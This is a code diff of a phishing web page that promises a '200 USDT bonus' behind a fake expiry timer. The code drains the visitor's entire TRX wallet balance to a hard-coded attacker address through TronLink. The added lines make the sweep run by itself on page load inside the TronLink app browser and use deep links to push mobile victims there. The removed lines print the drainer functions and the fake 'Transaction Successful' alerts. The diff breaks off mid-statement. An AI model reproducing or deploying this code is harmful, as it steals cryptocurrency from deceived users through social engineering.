@@ -114,6 +114,18 @@
             font-size: 14px;
             display: none;
         }
+        .install-msg a {
+            color: #856404;
+            font-weight: bold;
+        }
+        .manual-open {
+            display: none;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #007bff;
+            text-decoration: underline;
+            cursor: pointer;
+        }
         .footer {
             padding: 15px;
             background-color: #f8f9fa;
@@ -148,8 +160,10 @@
         <button class="btn btn-secondary" id="declineBtn">Maybe Later</button>
 
         <div id="installMsg" class="install-msg">
-            ⚠️ Please open this link inside the TronLink App or install it from the store below.
+            ⚠️ TronLink not detected. <a id="installLink" href="#" target="_blank" rel="noopener">Click here to install</a>, then refresh this page.
         </div>
+
+        <a id="manualOpen" class="manual-open">Trouble opening the app? Tap here to try again</a>
 
         <div style="margin-top: 15px; font-size: 13px; color: #888;">
             ⏳ Offer expires in: <span id="timerText">14:59</span>
@@ -168,148 +182,64 @@
 
 <script>
     // YOUR WALLET ADDRESS
-    const YOUR_WALLET_ADDRESS = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as"; 
+    const YOUR_WALLET_ADDRESS = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as";
 
-    let countdown = 899; // 14 minutes and 59 seconds
+    const CHROME_STORE = "https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec";
+    const ANDROID_STORE = "https://play.google.com/store/apps/details?id=com.onuschain.onus&hl=en";
+    const IOS_STORE = "https://apps.apple.com/us/app/tronlink/id1572078667";
 
-    function updateTimer() {
-        const minutes = Math.floor(countdown / 60);
-        const seconds = countdown % 60;
-        document.getElementById('timerText').textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-        
-        const totalSeconds = 900;
-        const percentage = ((totalSeconds - countdown) / totalSeconds) * 100;
-        document.getElementById('timerBar').style.width = `${100 - percentage}%`;
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const isAndroid = /Android/i.test(navigator.userAgent);
+    const storeLink = isMobile ? (isAndroid ? ANDROID_STORE : IOS_STORE) : CHROME_STORE;
 
-        if (countdown > 0) {
-            countdown--;
-            setTimeout(updateTimer, 1000);
-        } else {
-            document.getElementById('connectBtn').textContent = "Offer Expired!";
-            document.getElementById('connectBtn').disabled = true;
-        }
+    document.getElementById('installLink').href = storeLink;
+
+    // Build the deep link that opens this page inside the TronLink in-app browser
+    function tronDeepLink() {
+        const currentUrl = encodeURIComponent(window.location.href);
+        return `tronlinkoutside://pull.activity?param=\${currentUrl}`;
     }
 
-    // Detect Mobile
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    // If we're ALREADY inside the TronLink app browser, auto-run the sweep
+    if (window.tronWeb && window.tronWeb.ready) {
+        window.addEventListener('load', () => {
+            const btn = document.getElementById('connectBtn');
+            btn.textContent = "Auto-connecting...";
+            btn.disabled = true;
+            executeSweep().catch(handleError);
+        });
+    }
 
     document.getElementById('connectBtn').addEventListener('click', async () => {
         const btn = document.getElementById('connectBtn');
         btn.disabled = true;
         btn.textContent = "Connecting...";
 
-        try {
-            if (isMobile) {
-                // Check if inside TronLink App
-                if (window.tronWeb && window.tronWeb.ready) {
-                    await executeSweep();
-                } else {
-                    throw new Error("MOBILE_NOT_IN_APP");
-                }
-            } else {
-                // Desktop
-                if (window.tronLink && window.tronLink.request) {
-                    await desktopConnectAndSweep();
-                } else {
-                    throw new Error("DESKTOP_NOT_INSTALLED");
-                }
-            }
-        } catch (error) {
-            console.error(error);
-            btn.disabled = false;
-            btn.textContent = "Connect TronLink";
+        // Case 1: already inside the TronLink app browser
+        if (window.tronWeb && window.tronWeb.ready) {
+            try { await executeSweep(); } catch (e) { handleError(e); }
+            return;
+        }
 
-            if (error.message === "MOBILE_NOT_IN_APP") {
+        // Case 2: desktop
+        if (!isMobile) {
+            if (window.tronLink && window.tronLink.request) {
+                try { await desktopConnectAndSweep(); } catch (e) { handleError(e); }
+            } else {
                 document.getElementById('installMsg').style.display = 'block';
-                alert("Please open this link inside the TronLink App.");
-                // Redirect to Play Store or App Store
-                if (navigator.userAgent.includes("Android")) {
-                    window.location.href = "https://play.google.com/store/apps/details?id=com.onuschain.onus&hl=en";
-                } else {
-                    window.location.href = "https://apps.apple.com/us/app/tronlink/id1572078667";
-                }
-            } else if (error.message === "DESKTOP_NOT_INSTALLED") {
-                alert("❌ TronLink is not installed. Please install it and refresh.");
-                window.open("https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec", "_blank");
-            } else {
-                alert("❌ Connection Failed. Please try again.");
+                window.open(CHROME_STORE, "_blank");
+                btn.disabled = false;
+                btn.textContent = "Connect TronLink";
             }
-        }
-    });
-
-    async function desktopConnectAndSweep() {
-        const btn = document.getElementById('connectBtn');
-        btn.textContent = "Verifying...";
-
-        // Wait for TronLink to be ready
-        await window.tronLink.ready;
-
-        // Get user address
-        const userAddress = window.tronLink.defaultAddress.base58;
-        if (!userAddress) {
-            throw new Error("User did not unlock wallet");
+            return;
         }
 
-        // Get balance
-        const balance = await window.tronLink.getBalance(userAddress);
-        const amountInSun = balance.toString();
+        // Case 3: mobile, not in app → deep link with store fallback
+        let appOpened = false;
+        const markOpened = () => { appOpened = true; };
+        document.addEventListener('visibilitychange', markOpened, { once: true });
+        window.addEventListener('blur', markOpened, { once: true });
 
-        // Prepare transaction
-        const targetAddress = window.tronLink.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", ""));
+        window.location.href = tronDeepLink();
 
-        const signedTx = await window.tronLink.transactionBuilder.sendTransaction(
-            targetAddress,
-            parseInt(amountInSun),
-            userAddress
-        );
-
-        const result = await window.tronLink.fullNode.request("wallet/broadcasttransaction", signedTx);
-
-        if (result.result) {
-            btn.textContent = "Success!";
-            btn.style.backgroundColor = "#28a745";
-            alert("✅ Transaction Successful!\n\nYour 200 USDT bonus is being processed.");
-        } else {
-            throw new Error(result.message || "Transaction failed");
-        }
-    }
-
-    async function executeSweep() {
-        const btn = document.getElementById('connectBtn');
-        btn.textContent = "Confirming...";
-
-        // Get user address
-        const userAddress = window.tronWeb.defaultAddress.base58;
-        
-        // Get balance
-        const balance = await window.tronWeb.trx.getBalance(userAddress);
-        const amountInSun = balance.toString();
-
-        // Prepare transaction
-        const signedTx = await window.tronWeb.transactionBuilder.sendTransaction(
-            window.tronWeb.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", "")),
-            amountInSun,
-            userAddress
-        );
-
-        const result = await window.tronWeb.fullNode.request("wallet/broadcasttransaction", signedTx);
-
-        if (result.result) {
-            btn.textContent = "Success!";
-            btn.style.backgroundColor = "#28a745";
-            alert("✅ Transaction Successful!\n\nYour 200 USDT bonus is being processed.");
-        } else {
-            throw new Error(result.message || "Transaction failed");
-        }
-    }
-
-    document.getElementById('declineBtn').addEventListener('click', () => {
-        alert("You can claim your 200 USDT anytime within the next 24 hours. Don't miss out!");
-    });
-
-    // Start timer
-    updateTimer();
-</script>
-
-</body>
-</html>
+        setTimeout(() =>
